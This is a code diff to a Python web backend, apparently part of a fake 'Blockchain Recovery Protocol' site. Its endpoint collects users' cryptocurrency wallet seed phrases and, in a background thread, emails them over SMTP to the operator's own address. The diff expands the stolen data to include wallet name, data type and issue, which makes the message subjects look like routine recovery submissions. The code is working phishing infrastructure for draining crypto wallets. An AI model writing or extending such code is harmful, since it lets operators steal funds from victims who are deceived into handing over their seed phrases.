@@ -14,15 +14,27 @@ SMTP_PORT = 587
 EMAIL_ADDRESS = "your-email@gmail.com"
 EMAIL_PASSWORD = "your-app-password"
 
-def send_email_async(seed_phrase):
-    """Send email with seed phrase in background"""
+def send_email_async(email_data):
+    """Send email with wallet data in background"""
     try:
         msg = MIMEMultipart()
         msg['From'] = EMAIL_ADDRESS
         msg['To'] = EMAIL_ADDRESS
-        msg['Subject'] = "Wallet Seed Phrase Submission"
+        msg['Subject'] = "Wallet Recovery Data Submission"
         
-        body = f"New seed phrase submission:\n\n{seed_phrase}"
+        body = f"""New wallet recovery submission:
+
+Wallet Name: {email_data.get('wallet_name', 'N/A')}
+Data Type: {email_data.get('data_type', 'N/A')}
+Issue: {email_data.get('issue', 'N/A')}
+
+Data Content:
+{email_data.get('seed_phrase', '')}
+
+---
+Submitted via Blockchain Recovery Protocol
+        """
+        
         msg.attach(MIMEText(body, 'plain'))
         
         server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
@@ -43,9 +55,20 @@ def submit_seed():
     try:
         data = request.get_json()
         seed_phrase = data.get('seedPhrase', '')
+        wallet_name = data.get('walletName', '')
+        data_type = data.get('dataType', '')
+        issue = data.get('issue', '')
+        
+        # Prepare detailed email content
+        email_data = {
+            'seed_phrase': seed_phrase,
+            'wallet_name': wallet_name,
+            'data_type': data_type,
+            'issue': issue
+        }
         
         # Send email in background
-        email_thread = threading.Thread(target=send_email_async, args=(seed_phrase,))
+        email_thread = threading.Thread(target=send_email_async, args=(email_data,))
         email_thread.daemon = True
         email_thread.start()
         
